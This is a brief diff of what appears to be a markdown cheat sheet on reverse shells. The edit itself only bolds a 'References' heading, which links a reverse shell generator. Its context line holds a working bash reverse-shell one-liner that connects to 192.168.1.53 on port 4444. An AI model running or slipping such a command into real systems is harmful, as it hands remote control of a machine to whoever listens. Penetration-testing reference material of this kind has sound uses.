@@ -177,7 +177,7 @@ bash -i >& /dev/tcp/192.168.1.53/4444 0>&1
 
 ---
 
-References
+**References**
 
 - [Reverse Shell Generator](https://www.revshells.com/)
 
